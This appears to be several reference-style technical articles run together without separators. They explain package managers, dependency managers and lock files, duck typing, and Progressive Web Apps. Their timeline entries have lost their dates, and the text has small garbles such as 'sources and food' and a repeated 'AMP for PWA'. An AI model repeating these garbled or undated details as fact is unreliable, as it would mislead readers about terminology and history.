A package is simply an archive that contains binaries of software , configuration files , and information about dependencies .
The general workflow starts with the user requesting a package using the package manager ( PM ) available in the system .
The PM then finds the requested package from a known location and downloads it .
The PM then installs the package and advises on any manual steps that it finds necessary .
Why is the package manager required in the first place ?
Unix began its journey by being a programmer 's OS .
This means that every time a new program is written it has to be compiled , linked and run .
Unix has got the ability to use libraries ( " shared objects " ) , ELF executables , etc .
To solve the task of building more complicated software easily , a was developed .
The source code was getting shipped with a Makefile ( the file that 's used by make ) .
But it was still a laborious task as the developer or the maintainer had to take care of the dependencies .
Instead of running ` make ` commands every time on every machine having the same configuration , it was thought that we could have a package manager to ship the executable and also the dependencies to other machines .
Hence , the earliest PMs started evolving with this idea .
Today 's Linux distributions contain thousands of packages .
This has come about due to its modular design , code reuse , and collaborative code creation .
However , there 's a trade - off between code reuse and incompatible dependencies .
Package managers solve this complexity by streamlining the process .
What are the basic functions of a package manager ?
The basic functions of the PM are the following : Working with file archivers to extract package archives Ensuring the integrity and authenticity of the package by verifying their digital certificates and checksums Looking up , downloading , installing or updating existing software from a software repository or app store Grouping packages by function to reduce user confusion Managing dependencies to ensure a package is installed with all packages it requires , thus avoiding dependency hell The user interface of a PM may be a command line , a graphical interface , or both .
Often , users can search for packages by name or category .
Some even show user reviews or ratings of packages .
Batch installation is also possible with PM .
Some may support " safe upgrading " ( retaining existing versions ) or " holding " ( locking package to a specific version ) .
What exactly is Dependency Hell ?
Dependency Hell is a colloquial term that developers use to indicate their frustration with managing complex inter - dependencies among packages .
In Windows , the equivalent term could be DLL Hell .
When a package depends on another package as a prerequisite , it will either not install or work incorrectly if the latter is missing or incorrectly set up .
A developer may attempt to install the dependency , which in turn may depend on yet more packages .
This could quickly become unmanageable if the developer tries to install all these dependencies manually .
It could also happen that a dependent package is installed but it 's of an older incompatible version .
Two packages A and B might require different versions of package C. This could be a problem if only one version can be installed in the system .
Circular dependencies could also cause problems .
Package managers solve this problem by resolving dependencies .
Because every package comes with metadata , the PM knows what the dependencies are and what versions of those dependencies ought to be used .
Package managers , if properly used , solve the problem of dependency hell .
From where do packages get downloaded ?
Packages are downloaded from software repositories , often simply called repos .
Alternative terms include sources and food .
These repos are available online at well - defined locations and they serve as a central distribution point for packages .
For performance and redundancy , these repos may be mirrored by many other locations worldwide .
As an example , Cygwin uses mirror sites .
Local repos may also mirror remote official repos to save bandwidth or tighter privacy .
Ubuntu 's ` apt - mirror ` provides this feature .
While most developers will use these repos to download packages , advanced developers can also contribute or upload packages to be hosted at these repos .
All repos publish the process that developers need to follow to upload packages .
Official repos have a strict review and approval process .
Community - managed repos may have a more relaxed process .
In all cases , repositories are meant to be malware free .
How would a package manager know the location of the repository ?
Every package manager has associated configuration files that point to repository locations .
For example , in Ubuntu , ` /etc / apt / sources.list ` contains the locations of repositories .
This would include the official repos , but users can also update this file to get packages from other repos .
Likewise , configuration for Fedora and CentOS distributions are at ` /etc / yum.conf ` for YUM and ` /etc / dnf / dnf.conf ` for DNF .
For Arch Linux , it is at ` /etc / pacman.conf ` when pacman is used .
When adding third - party repos to a package manager , users must take care to check that those repos can be trusted .
This is important so that you do n't end up with malware infecting your system .
In fact , this is one of the problems solved by trusted repos .
Instead of downloading software from a third - party website , downloading it via the package manager from a trusted repo is a more secure practice .
What 's in the package ?
A package includes the concerned software , which may be an application or shared library .
If it 's a development package , it will include source files ( such as header files ) to build your software that depends on a library .
Packages are meant for specific distributions and therefore installation paths , desktop integration and startup scripts are set up for the targeted distribution .
Package formats could include * .tgz ( for source code archives ) , * .deb ( for Debian ) or * .rpm ( for Red Hat ) .
Packages include metadata as well .
This will include summary , description , list of files , version , authorship , targeted architecture , file checksums , licensing , and dependent packages .
This metadata is essential for the package manager to do its job correctly .
Could you give examples of Linux package managers ?
Package managers are used in different Linux distributions .
Source : The Linux Foundation 2015 , ch .
7 , sec .
5 .
All Linux distributions do n't use the same package manager .
The Debian family , which includes Ubuntu , uses ` apt - get ` and ` dpkg ` .
Where possible , apt - get should be preferred since it will resolve all dependencies ; dpkg does n't resolve dependencies but it can work directly with * .deb files .
Also , apt - get invokes dpkg for low - level operations .
Other relevant Debian tools are ` apt - cache ` and ` aptitude ` .
In RedHat , Fedora and SUSE distributions , ` rpm ` is the low - level package manager .
Arch Linux uses Pacman .
Slackware distribution includes ` pkgtools ` and ` slackpkg ` but neither of these resolve dependencies .
Slackware takes a unique approach .
They distribute packages as intended by the original creators .
They give full control to administrators by not resolving dependencies .
It 's common for distributions to offer graphical interfaces for those users who are n't comfortable with remembering or typing commands .
YaST ( openSUSE ) and Synaptic ( Debian ) are two examples of GUIs .
For those comfortable with commands , look up this handy reference .
Could you give examples of language package managers ?
Dozens of language / tool package managers tracked at libraries.io .
Source : https://libraries.io Modern languages are delivered as a core part that comes with the default installation plus a wide range of optional packages that can be installed when necessary .
Those that manage these add - ons are called language package managers .
Within the scope of a project or application , the term dependency manager is used .
The term package manager is used at system / language level whereas dependency manager is used at project level .
For example , in PHP , PEAR can be called a package manager while the Composer is a dependency manager .
Let 's say , you 're working on a Python project .
This may depend on many other Python packages for correct execution .
Moreover , another Python project will have its own dependencies .
A dependency manager helps developers manage these dependencies and share their project settings in a consistent manner with others .
Here are some examples , in the format of " language : ( manager , repository ) " : Python : ( pip , PyPI ) PHP : ( Composer , Packagist ) Ruby : ( RubyGems , RubyGems ) , ( Bundler , Bundler ) Node.js and JavaScript : ( NPM , NPM ) , ( Yarn , ( Yarn , NPM ) ) Web frontend : ( Bower , Bower ) , ( Yarn , ( Yarn , NPM ) ) Java : ( Maven , Maven ) , ( Gradle , ( Ivy , Maven , etc .
) ) What package managers are available for MAC ?
Homebrew , MacPorts and Fink are just a few examples of package managers for MAC .
Does Windows have a package management system ?
Architecture of package management in Windows 10 .
Source : Xumins 2015 .
In 2006 , Microsoft Vista got a package manager .
Years later , there was Windows Update ( with Microsoft Store as repo ) .
These were not very useful since they could manage only Microsoft software .
For example , they could n't update your Node.js or Firefox installation .
To solve this , third - party package managers are available : Allmyapps , Chocalatey , Intel AppUp , OpenWrap , NPanday , Chewie , Ninite , and Npackd .
In 2014 , Microsoft introduced OneGet , which was later renamed PackageManagement .
Via the Windows PowerShell interface , it can install and manage even non - Microsoft software .
OneGet was available in Windows 8.1 but it 's included by default in Windows 10 .
PackageManagement is able to handle different installer technologies ( MSI , MSU , APPX , etc .
) and different sources .
The default repo used is called PowerShell Gallery .
For .NET developers , NuGet is the package manager to use .
In addition , when using Visual Studio Team Services and Team Foundation Server , it 's easy for developers to manage NuGet , npm , and Maven packages for their project requirements .
If there are options , how should I choose a package manager ?
Here are a few things to consider : Ease of use : A graphical interface can be great for beginners .
For command - line interface , commands have to be intuitive .
Features : Look for more than just managing packages : list available / installed packages , search , filter , remote / local installs , wildcard support , source / binary package support , etc .
Customization : Check if it supports customization such as interactive mode to let user decide on the next step during installation .
Speed : Faster the better and this might depend on how well caching is done .
Ease of development : For package developers , the workflow should be easy , including a simple upload to a repository .
The concept of using make and Makefile was invented in Bell Labs by Stuart Feldman .
This simplifies the process of building software .
The make system can read dependencies and thus lays the conceptual framework for package managers that are to appear years later .
David Mackenzie starts work on a tool called autoconf .
It can look at a system and generate the appropriate configuration / header files and makefile .
These can then be used to build the software .
Rather than relying on just versions , it relies on features to check for dependencies .
Some users of TeX ( used for typesetting ) have started working on the Comprehensive TeX Archive Network ( CTAN ) for distributing Tex - related materials and software .
This may be one of the earliest examples of distributing packages over the Internet from a central point .
Prior to this , it was common to share software via newsgroups .
FreeBSD 1.0 has been released and it comes with what 's called ports tree , a package building framework that uses make .
This release includes ` pkg_install ` and other ` pkg _ * ` tools .
In the world of Linux , this is probably the earliest package management system .
Support for using remote repos came in 1999 with version 3.1 .
Version 1.0 of Bogus Linux distribution includes a package manager named Package Management System ( PMS ) .
RedHat 's well - known RedHat Package Manager ( RPM ) has been released with version 2.0 of the distribution .
The same year , the Comprehensive Perl Archive Network ( CPAN ) was launched as a repository for Perl .
The initial version of Debian 's Apt is released .
This is an acronym for Advanced Packaging Tool .
Windows introduces OneGet that can manage even non - Microsoft software .
This later becomes PackageManagement and is accessible via the PowerShell interface .
Modular software is composed of modules that could depend on other modules .
Source : Elena 2017 .
A good practice in software design is to build software from smaller , single - purpose modules that expose well - defined interfaces .
This is also in the spirit of software reuse .
With the widespread adoption of open source software , often our own applications or modules depend on those written by others .
Thus , to build our software we need to bring in all parts on which it depends , including language libraries and remote third - party modules .
But it 's not trivial to ensure that we have all the necessary dependencies , particularly when dependencies themselves depend on others .
This is why we need a Dependency Manager , often invoked during the software build process .
A useful definition states that , Dependency management is a technique for declaring , resolving and using dependencies required by the project in an automated fashion .
Is n't a dependency manager the same as a package manager ?
No .
A package manager operates at the system level and most often deals with binaries .
Its role is to install libraries , tools , and other applications .
It affects the entire system and not just one project .
Because of this , it requires root access .
Examples of package managers are apt - get ( Linux ) , Brew ( MacOS ) , and Chocolatey ( Windows ) .
A dependency manager operates at the source code level .
Its role is to setup the right dependencies for a particular application .
It therefore implies that a dependency manager is something used by developers , not users or system admins .
Thus , a dependency manager is project specific .
It helps in easy management of project dependencies .
It has to ensure that the same source code is used across environments , for example , when moving from Windows developer machine to the Linux production system .
There should be end - to - end visibility of dependencies .
A dependency manager is essential for Continuous Integration .
A good dependency manager should also make it easy to publish new packages .
What are the main components of a dependency management system ?
A dependency management system typically has the following components : Module : A software artefact , that we wish to use in our project .
Depending on the language , modules are also called packages or libraries .
Modules come with metadata to indicate dependencies .
Manifest : Usually a file that specifies immediate / direct dependencies for our project .
It specifies intent , such as , saying that we desire " version 2.3 or above of module A " .
Lock : Usually a file that captures a particular realization of the developer 's intent .
To extend the above example , version 2.3.2 of module A might be used .
Repository : A place where modules are stored .
Often repos are remote and accessed over the internet .
The Dependency manager usually knows the location of the repo but location can also be specified in the manifest file .
Dependency Constraint : Usually in the manifest file , this is a constraint about versions of a module that are allowed for this project .
Resolution Rule : Rules are applied by the dependency manager to arrive at a suitable module version .
Selecting the right version is called Dependency Resolution .
What 's the usual Project Dependency Management ( PDM ) pipeline ?
A PDM pipeline involves four states and their forward transitions .
Source : Boyer 2016 .
Dependency managers bring together all necessary project dependencies before passing them to the compiler or interpreter .
In this sense , their work is somewhat a preprocessing phase before the actual building happens .
Dependency managers start by reading the manifest file , in which direct dependencies are noted .
They then read the metadata of these dependencies from their repositories to figure out the next level of dependencies .
In other cases , they may download the dependencies right away and then process their dependencies .
Either way , all dependencies must be downloaded and installed .
Exact installed versions of dependencies are recorded in a lock file .
While the manifest file is important for a developer , the lock file has greater importance for operations folks .
The lock file makes the project 's dependencies reproducible in any environment .
What is transitive dependency ?
Transitivity is a concept in logic and mathematics .
In the context of software dependencies , it can be explained as follows .
If module A depends on module B , which in turn depends on module C , we can say that module A also depends on module C. Many levels of dependencies produce what 's called a Dependency Graph .
When a module appears multiple times in the graph , with different version numbers , the dependency manager must make a decision about which version to use .
A similar decision must also be made when dynamic version numbers are specified .
This selection process is called Dependency Resolution .
A good dependency manager will not only resolve direct dependencies as mentioned in your project 's top - level manifest file , but also resolve all transitive dependencies .
It should be able to handle any level of nesting .
Typically , cyclic dependencies will cause problems .
Could you mention some rules used in Dependency Resolution ?
We mention a few sample rules below for specific dependency managers .
However , similar rules are likely to exist across many dependency managers .
In Gradle , after taking into account all transitive dependencies and constraints , the most suitable version is selected .
If there 's a conflict , an error is made .
You can also use dependency configurations and make manual adjustments .
Maven uses the nearest version , but if conflicts are at the same depth , the first one wins based on the order of declaration .
NuGet uses four main rules : lowest applicable version , floating versions , nearest - wins , and cousin dependencies .
This rule is applied with a warning since the package at a deeper level might get downgraded to an older version .
NPM actually builds a dependency tree , where different versions of dependent packages can be installed in different branches of the tree .
However , using what 's called " peer dependencies " , NPM allows us to enforce the same versions where desired .
What 's the purpose of locking files used by dependency managers ?
The auto - generated Gopkg.lock is used in Go .
Source : Yuen 2018 .
If dependencies are specified in terms of exact versions , anyone else trying to build your project in any other environment will use the same versions .
When dynamic version numbers are specified in manifest files , such as a range of versions , the version used may depend on the environment or the latest version available in the repository at build time .
Dynamic version numbers are good because they allow us to bring in the latest features / patches of dependent modules into our project .
However , this causes uncertainty about continuous integration and production release .
To solve this , versions used are recorded in a lock file .
This lock file must be committed to version control so that anyone else using the project is guaranteed to use the same versions .
What if you use only exact versions ?
Is a lock file required in such a case ?
Yes .
Even if direct dependencies are exact , transitive dependencies might be specified in a non - exact manner .
Therefore , a locked file is essential in all cases .
A Lock file is sometimes called " a manifestation of the manifest " .
What should I look for when choosing a dependency manager ?
The purpose of a dependency manager is to allow developers to create a consistent and reproducible set of dependencies for their projects .
It should be easy to use , have a well - defined behaviour and hooks for customizations .
Some essential features to compare are the following : Organization : For example , Yarn uses flat mode while NPM builds a dependency tree .
Semantic Versioning : Has provision to specify a range of versions .
Dependency Locking : Uses lock files to reproduce exact versions .
Dependency Resolution : Handles transitive dependencies .
Resolves conflict with a well - defined set of rules .
Multiple Configurations : Allows different versions of the same package .
This is enabled by defining different configurations or groups , such as build vs testing .
Performance : Caches downloaded packages for faster updates .
Parallel downloads .
Security : Does integrity checks via package checksums .
Customizations : Dependencies can be made optional or versions can be manually specified .
It can be configured to fetch from any repository .
Supports offlineinstallation.$MERGE_SPACE
Support : Has good community support and adoption , with frequent updates .
What are some best practices that developers can adopt to better manage project dependencies ?
Developers need to version control not only the source code but also the manifest file and the lock file .
In particular , always version control your lock file if you 're building an application .
If you 're building a library , it 's a good idea to do this as well .
However , if you wish to build your library with the latest versions of its dependencies , it 's recommended to use a second continuous integration building .
If you 're making a Java library , let it not depend on frameworks such as Spring .
Changes to frameworks can cause " dependency hell " for users of your library .
Do n't ship fat JAR files , files that include all dependencies .
only depends on what you need .
Finally , it 's best to avoid dependencies if you can implement them yourself .
The argument is that this will keep your application lean and secure .
Check if there 's a native library to do the equivalent .
Look for those with less transitive dependencies .
Check memory usage and load time .
Use fewer high - level interfaces .
Prefer low - level function calls .
Use abstractions .
Test regularly in target environments .
Could you give examples of dependency managers in various languages ?
A few examples of dependency managers are listed below in the format name : ( language , default repo , default manifest , default lock ) : Composer : ( PHP , Packagist , ` composer.json ` , ` composer.lock ` ) Gradle : ( Java , Maven Central , ` build.gradle ` , ` gradle / dependency - locks/*.lockfile ` ) Node Package Manager ( NPM ) : ( NodeJS , NPM , ` package.json ` , ` package-lock.json ` ) Yarn : ( NodeJS , NPM , ` package.json ` , ` yarn.lock ` ) Bundler : ( Ruby , RubyGems , ` Gemfile ` , ` Gemfile.lock ` ) dep : ( Go , - , ` Gopkg.toml ` , ` Gopkg.lock ` ) Cargo : ( Rust , Crates.io , ` Cargo.toml ` , ` Cargo.lock ` ) Pipenv : ( Python , PyPI , ` Pipfile ` , ` Pipfile.lock ` ) In many languages , newer , better dependency managers are being preferred over older ones : Gradle over Maven and Any - Ivy ( Java ) ; Yarn over NPM and Bower ( JavaScript ) ; Bundler over RubyGems ( Ruby ) ; Composer over PEAR ( PHP ) ; dep over godep , glide and govendor ( Go ) .
In some cases , such as dep in Go , there 's no default repository .
The manifest file includes information on package sources .
Gradle did not initially support locking , but locking could be implemented using Netflix 's Nebula Plugins project .
This plugin inspired Gradle to support locking .
While ` build.gradle ` specifies dependencies at the top level , module metadata files ( .module , .pom or ivy.xml ) must also be read .
In which languages are dependencies more often used ?
A look at dependency counts in some popular languages .
Source : Szulik 2018 .
One study of 6.9 million versions of open source packages across 14 repositorys showed that NPM and CPAN have higher dependency counts ; all others have 5 or less dependencies , on average .
NPM and CPAN also have a larger spread .
In general , the higher the count , the more complex the dependency graph .
While using third - party packages saves development time , there are also risks in terms of security , licensing and performance .
Application health depends on all the dependencies that we bring in .
Each repository contains packages of a particular language : NPM ( JavaScript ) , CPAN ( Perl ) , Rubygems ( Ruby ) , Maven ( Java ) , Packagist ( PHP ) , Cargo ( Rust ) , Atom ( JavaScript ) , Pub ( Dart ) , CRAN ( R ) , PyPI ( Python ) , NuGet ( .NET / C#/F#/Visual Basic ) , Elm ( Elm ) , Hex ( Erlang ) , Dub ( D ) .
Libraries.io tracks open source packages across different repositories .
Since Go language does n't have a default repository , Go Search provides a handy search functionality .
Based on the Project Object Model ( POM ) , Maven 1.0-beta-2 has been released for managing Java projects .
Maven 1.x reaches the end of life in 2014 .
As a rewrite of Maven 1.x , with extra functionality , Maven 2.0 was released in October 2005 .
Popular Maven plugins are also converted to the new version .
Maven 2.0 can manage transitive dependencies .
For managing dependencies for Java , including Android projects , Gradle v0.7 is released .
Version v1.0 follows in June 2012 .
Version v4.8 was released in June 2018 .
Version v4.8 includes support for dependency locking .
As a dependency manager for Ruby , Bundler V1.0.0 is released .
The earliest release can be traced to 2009 .
The Ruby community is credited with introducing the concept of dependency locking .
Maven Dependency Diagrams from JetBrains ' IntelliJ IDEA can flag version conflicts .
Source : Bulenkov 2010 .
While being compatible with Maven 2.x projects and plugins , Maven 3.0 has been released .
Among other things , it isolates project and plugin dependencies , and does better dependency resolution .
Version v1.0.0rc9 of Node Package Manager ( NPM ) for NodeJS / JavaScript has been released .
Release v0.0.1 can be traced to January 2010 .
As a dependency manager for Xcode projects ( Objective - C or Swift ) , CocoaPods 0.0.1 is released .
Version 1.0.0 was released in May 2016 .
An alternative to CocoaPods is Carthage that trades configuration for convention .
Version 1.0.0-alpha1 of Composer has been released as a dependency manager for PHP .
Version 1.0.0 was released in April 2016 .
The composer has been inspired by Node 's NPM and Ruby 's Bundler .
The Composer uses Packagist as its default repository , but for internal / Intranet use , Satis is an alternative .
To overcome the limitations of NuGet , Paket has been released as a dependency manager for .NET .
NuGet can be seen as a package manager .
It does n't handle transitive dependencies and selects the latest version when there are conflicts .
Paket solves these problems of NuGet .
With initial code committed from March 2014 , Cargo version 0.4.0 is released as a dependency manager for Rust .
As of June 2018 , version 0.28.0 is the latest available .
Steps taken by Yarn for managing dependencies .
Source : Hanif 2017 .
Version 0.2.0 of Yarn has been released for dependency management for NodeJS / Javascript .
Version 1.0.0 was released in September 2017 .
For performance , Yarn caches downloaded packages and does downloads concurrently .
It uses checksums to verify the integrity of downloaded packages before installing them .
It 's inspired by Bundler , Cargo and NPM .
Version 5.0.0 of NPM has been released for NodeJS / JavaScript .
This version introduces dependency locking .
In July , version 5.1.0 was released to fix a problem that ignored changes to packages.json when a lock file was present .
For managing dependencies for Go , dep v0.2.0 has been released .
A humorous and apt representation of duck typing .
Source : Mastracci , 2014 .
Duck Typing is a way of programming in which an object passed into a function or method supports all method signatures and attributes expected of that object at run time .
The object 's type itself is not important .
Rather , the object should support all methods / attributes called on it .
For this reason , duck typing is sometimes seen as " a way of thinking rather than a type system " .
In duck typing , we do n't declare the argument types in function prototypes or methods .
This implies that compilers ca n't do type checking .
What really matters is if the object has the particular methods / attributes at run time .
Duck typing is therefore often supported by dynamic languages .
However , some static languages are beginning to " mimic " it via structural typing .
What 's the origin of the phrase " duck typing " ?
The phrase originates from an old saying , If it walks like a duck , swims like a duck , and quacks like a duck , then it probably is a duck .
What does this mean ?
Even a non - duck entity that behaves like a duck can be considered a duck because the emphasis is on behaviour .
By analogy , for computing languages , the type of an object is not important so long as it behaves as expected .
This behaviour is defined by the object 's methods / properties / attributes while expectations are set by those who invoke the methods / properties / attributes .
For example , a ` Book ` class is expected to have an attribute ` numPages ` and a method ` getPage(number ) ` , where ` number ` is an integer .
Let 's say a function ` searchPhrase(book , phrase ) ` is meant to search for a given phrase in a book .
This function is called ` book.getPage ( ) ` for all ` book.numPages ` of the book .
A ` Newspaper ` is obviously not a book , but with duck typing this does n't matter .
If ` Newspaper ` has implemented ` numPages ` and ` getPage(number ) ` , it can be passed into ` searchPhrase(book , phrase ) ` as if it 's a book .
Though it 's not a book , it 's sufficient that it behaves like one within the context of ` searchPhrase ` .
What 's the advantage of having duck typing ?
Duck typing is more about convenience than type safety .
Source : Cui , 2015 .
It 's been said that dynamic typing in general cuts down on development time .
There are fewer boilerplate codes .
Code is easier to hack .
With static typing , compile - time checks slow down the development process .
Static typing could be used at a later point to get better performance .
Others recommend duck typing only for prototyping and never for production .
While it 's true that compile - time checks are useful to catch potential problems early , duck typing enforces following coding conventions , documentation and test - driven methodologies .
Since duck typing is n't exactly a type of system , it gives programmers flexibility .
In Python , for example , common things are simpler to code .
While static typed languages use interfaces , such interfaces may involve excessive refactoring of client code .
Is n't duck typing more like late binding than a type system ?
It can be argued that duck typing is not really a type system in the sense of run - time or compile - time type systems .
Type systems typically prescribe rules for defining types , for deducing types from expressions , for determining legality of expressions or storage based on types , and so on .
Duck typing does n't do any of these .
Joe Esposito has commented that , " Duck typing is based around conventions , written in the docs instead of code .
This allows the language to defer the type system " .
Late binding is when an object or method is bound to a name at run time .
Duck typing looks similar to late binding except for a subtle difference that it 's based on behaviour rather than declared type .
One way to understand this is to recognize that C # ( a static typed language ) allows for method overloading where methods differ only by their argument types .
This is not possible in Python ( dynamic typed language ) but duck typing fills in since run - time behaviour is emphasized rather than the type of the object passed to the method .
Also , because it 's interpreted and does late binding , duck typing is easy to do .
Can you compare duck typing with structural typing ?
An Example of structural typing in Scala .
Source : Underwood , 2017 , slide 42 .
Joe Esposito makes a distinction between static duck typing and dynamic duck typing .
With the latter , compile - time checks are skipped and this is what we mean when we refer to duck typing .
Static duck typing is similar to structural typing that some static typed languages ( Scala , F # ) support .
Structural typing allows for some compile - time checks , not on types but on the supported methods / attributes .
Structural typing may be seen as a compiler - enforced subset of duck typing .
However , we should also note that structural typing is essentially static typing while duck typing is dynamic .
Just as duck typing is for dynamic typed languages , so is structural typing for static typed languages .
Erlang 's behaviours can be seen as static duck typing , that is , with compile - time checking .
Among the languages that support structural typing are Scala , OCaml , Go , Elm and PureScript .
Can we say that duck typing is another name for implied interfaces ?
Static typed languages use explicit interfaces .
In C # , we use interfaces : any type that implements an interface can be passed into a method / function that accepts that interface .
This was how flexibilty was built into static typed languages , but this required upfront interface declaration .
Python does n't have explicit interfaces : interfaces are implied .
For Python , this is not different from duck typing .
However , implied interfaces are supported by C++ ( for example ) in its STL library .
Given that C++ does compile - time checks , we ca n't say in general that implied interfaces are the same as duck typing .
Note that when interfaces are implied , there 's no formal interface definition , and at best , it may be shared documentation .
What languages support duck typing ?
Python and Ruby support duck typing , both of which are dynamic typed languages .
In general , dynamic typed languages such as JavaScript and TypeScript support duck typing .
While C # does n't , some parts of .NET use duck typing .
In Ruby , for example , ` StringIO ` does n't have ` IO ` in its class hierarchy .
Yet , it behaves like an ` IO ` due to duck typing .
In fact , we may say that ` StringIO ` and ` IO ` share a common protocol , which is exactly how the duck typing concept is seen in OOP languages such as Smalltalk and ObjectiveC. This can be said of Python as well .
For example , an iterable is one that supports the iterator protocol , which is nothing more than implementing necessary methods for an object .
It 's interesting to note that duck typing has inspired the creation of a new language called Duck].(http://ducklang.org/ ) .
How is duck typing related to LBYL and EAFP ?
Duck typing and EAFP .
Source : Schafer , 2016 .
LBYL expands to Look Before You Leap while EAFP expands to Easy to Ask for Forgiveness than Permission .
Both these concepts are typically discussed in Python ( and possibly other languages as well ) .
Python prefers the EAFP approach , which is the opposite of LBYL .
With LBYL , we typically check if an object is of a compatible type before performing operations on it , such as calling its method .
Python has a built - in function ` isinstance ( ) ` to do this .
With EAFP , we simply call the object 's method , expecting that method to be present .
If it 's not , an exception will be thrown by the Python interpreter , which the code is expected to handle .
With duck typing , validating an object 's type is not Pythonic .
Thus , duck typing plays well with Python 's preference for EAFP , though the use of ` hasattr ( ) ` can be used instead .
Emil Mazey states at a meeting that " I ca n’t prove you are a Communist .
But when I see a bird that quacks like a duck , walks like a duck , has feathers and webbed feet and associates with ducks — I’m certainly going to assume that he is a duck .
" The phrase might have originated earlier from James Whitcomb Riley ( 1849–1916 ) .
Languages of the 1980s such as Smalltalk-80 and Objective - C have the concept of protocols , where the interface is more relevant than the class .
In 1992 , with reference to Smalltalk-80 , William R. Cook of Apple Computer states that the interface hierarchy is more useful than the inheritance hierarchy .
What may be one of the earliest uses of the term " duck typing " among programmers , Alex Martelli discusses it on the ` comp.lang.python ` Google Group as an alternative to method overloading of C++ .
He states that duck typing is closer in spirit to the polymorphism of C++ .
He clarifies , You do n't really care about IS - A -- you really only care about BEHAVES - LIKE - A-(in - this - specific - context ) , so , if you do test , this behaviour is what you should be testing for .
PEP 544 proposes introducing structural subtyping to Python .
A Progressive Web App ( PWA ) is a web app that uses the latest advances in web technologies and browser support to deliver users an app - like experience .
Like any traditional mobile app , a PWA can be launched from an icon installed on the mobile home screen , data can be cached for offline use and you can receive push notifications even when the browser is closed .
PWAs do n't have a navigation bar or URL bar usually seen in web browsers .
Thus , they can deliver the same fullscreen experience as mobile apps .
Compared to mobile web , PWAs have better performance and thereby improve user retention and engagement .
At the same time , unlike native apps , they do n't need long downloads and installs .
They 're also easier to deploy and maintain since developers do n't have to worry about different versions of the app out there .
Why do we need PWA ?
Progressive Web Apps : What , Why , and How ?
.
Source : Google Developers YouTube , 2017 .
The next billion users to come online will be from the developing world and they are likely to do so from their smartphones rather than desktops .
They are likely to consume rich multimedia and do voice - based searches .
They 're also likely to use low - end devices with limited memory , storage and processing .
53 % of users leave a page that takes longer than 3 seconds .
An average mobile web page takes 19 seconds to load on a 3 G connection .
Among Indian mobile users , 33 % run out of storage every day .
79 % of shoppers wo n't return to slow sites .
20 % of users are lost at every step of the native app installation process .
Hybrid apps tried to bring app - like experience by wrapping web apps into installable mobile apps , but this approach may give way to PWA .
Many others tried to deliver app - like experiences but sacrificed web linkability in the process .
What we need is a way to improve the user experience , even on low - end devices with limited memory and slow or no connections .
PWA aims to deliver this .
What 's so " progressive " about PWA ?
PWA are web apps that " progressively change with use and user consent to give the user a more native - app - like experience .
" Unlike native apps , PWA does n't ask users for upfront permission to install the app or access private data .
PWA involves minimum friction for users .
If the user is happy with the website , she can choose to add it to her homescreen .
The site earns the right to become an app .
It is becoming an app .
If new features are introduced into web standards ( example , Payment Request API , Credential Management API or WebVR ) , and when browsers support them , and when apps start using them , the entire experience becomes richer and more progressive for users .
The experience is seamless .
It does n't involve new installs .
Users can continue using older versions of browsers until they are ready .
We call this progressive enhancement .
This means that even on browsers that do n't support service workers , progressive enhancement allows those browsers to display content .
It 's been said that progressive enhancement is the opposite of graceful degradation .
Let 's also note that publishers can deploy a PWA without the approval process that native apps go through to get listed on an app store .
What are the key enablers of PWA ?
Service workers are essential for PWA .
Source : Kumar , 2016 .
We can identify three key enablers of PWA : Service Workers : These cache data , serve data from cache in offline mode or when downloading fresh content in the background , and enable push notifications .
While service workers do caching for offline mode , they also bring reliability in the face of varying network conditions .
We can view service workers as proxies implemented in JavaScript .
These are proxies listening for network activity , intercepting them and handling them programmatically .
Application Shell Architecture : The app 's layout is already with the service worker and hence this can be shown to user while content is being downloaded in the background .
Thus , the " app shell " is almost instantly shown to the user without any waiting time .
We can think of this shell as minimal HTML , CSS and JS without the dynamic content .
An App shell is not a Web API but really a design approach that works nicely with the capabilities of service workers .
Application Manifest : This tells the browser that the mobile website can be installed as an app .
What are the characteristics of a good PWA ?
In general , Google states that a delightful web experience needs to be fast , integrated , reliable and engaging .
To quality as PWA , an app should have the following characteristics : Progressive : Works across browsers and enabled with progressive enhancement .
Responsive : Works on a variety of devices of different form factors .
Connectivity - independent : Service workers make this possible by serving from a cache .
App - like : Browser tabs and navigation are replaced with app shell architecture and app style navigation .
Fresh : Service workers keep dynamic content up to date .
Safe : All communication is over HTTPS .
Discoverable : Manifest file allows them to be identified as PWA .
Search engines can find them .
Re - engageable : Push notifications keep user engagement and retention high .
Installable : Add to the homescreen without requiring a download and install via an app store .
Linkable : Deep link to specific pages within the app .
The power of web linking is not sacrificed .
Is PWA a new web standard ?
No .
Making a PWA is simply using existing web standards and adopting certain best practices to improve the user experience .
PWAs combine the best of the web and native apps .
Having said that , browsers and platforms can recognize an app as a PWA and give it special handling .
For example , they may make it easier to add a PWA to your homescreen , list it among installed native apps or even add it to their app stores .
What tools and techniques are available for building a PWA ?
The cached app shell loads first while dynamic content is shown when available .
Source : Osmani and Gaunt , 2015 .
Since PWA uses an app shell , it 's important to keep the shell minimal .
The app infrastructure and UI should be separated from the data .
The former can be cached and only data needs to be fetched when changes occur .
The use of the PRPL pattern is common when building a PWA .
Polymer templates can be used for this .
HTTP/2 server push and/or the use of ` < link > ` can improve performance .
Code splitting and lazy loading have been suggested .
Feature detection and CSS fallbacks can help in delivering progressive enhancements .
Consider using Knockout for small projects .
The Application tab of Chrome Developer Tools is useful during development .
It also comes with Lighthouse , which can give a PWA conformance score for your app .
HN PWA is a useful reference that has Lighthouse scores of different frameworks .
The Service Worker Cookbook , PWABuilder , Workbox , sw - precache and sw - toolbox are useful resources .
In Chrome or Opera , ` chrome://serviceworker - internals ` can be useful .
Osmani and Gaunt mention other useful tips and tricks .
Can I use PWA along with Accelerated Mobile Pages ( AMP ) ?
A comparison of AMP and PWA .
Source : Backaus , 2016 .
PWA loads an app shell first while service workers download and cache the dynamic content in the background .
Cache helps when users revisit the page , but PWA does not cut down on load time for the first access .
This is the problem that Accelerated Mobile Pages ( AMP ) aims to solve .
AMP gives the experience of " instant " loading of content at first access .
They achieve this by statically laying out content and avoiding JS execution .
In addition , AMP caches content for subsequent requests .
AMP is suitable for static content but when dynamic functionality is required ( push notifications , web payments , etc .
) PWA is more suitable .
In fact , AMP can work nicely with PWA .
Different models have been proposed : AMP as PWA , AMP for PWA , AMP for PWA .
Thus , AMP and PWA should be seen as complementary technologies .
As an example , AMP HTML can be the canonical data format that 's downloaded and cached by PWA service workers .
Alex Russell says of AMP and PWA , AMP gets content in front of users fast .
PWA delivers reliable performance for re - visits .
How does PWA relate to Single Page Applications ( SPAs ) ?
SPAs are heavy on JavaScript and regardless of the framework of choice , they use the App Shell Architecture .
